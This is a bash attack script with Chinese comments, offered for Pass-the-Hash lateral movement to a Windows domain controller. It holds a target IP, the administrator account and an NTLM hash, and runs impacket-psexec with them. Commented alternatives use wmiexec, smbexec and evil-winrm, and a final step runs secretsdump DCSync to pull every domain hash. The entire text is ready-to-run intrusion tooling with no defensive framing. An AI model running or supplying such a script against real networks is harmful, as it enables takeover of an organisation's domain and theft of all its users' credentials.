#!/bin/bash
# PTH 拿域控脚本（Pass-the-Hash 横向移动到域控）

DC_IP="192.168.1.10"
DOMAIN="corp"
USER="administrator"
HASH="aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c"

echo "[*] 使用域管哈希 PTH 连接域控"

echo "[*] 方式一：PsExec PTH"
impacket-psexec -hashes ${HASH} ${DOMAIN}/${USER}@${DC_IP}

echo "[*] 方式二：WMIExec PTH"
# impacket-wmiexec -hashes ${HASH} ${DOMAIN}/${USER}@${DC_IP}

echo "[*] 方式三：SMBExec PTH"
# impacket-smbexec -hashes ${HASH} ${DOMAIN}/${USER}@${DC_IP}

echo "[*] 方式四：Evil-WinRM PTH（需要 WinRM 开放）"
# evil-winrm -i ${DC_IP} -u ${USER} -H ${HASH##*:}

echo "[*] 成功后执行 DCSync 获取所有域哈希"
# impacket-secretsdump -hashes ${HASH} -just-dc ${DOMAIN}/${USER}@${DC_IP}
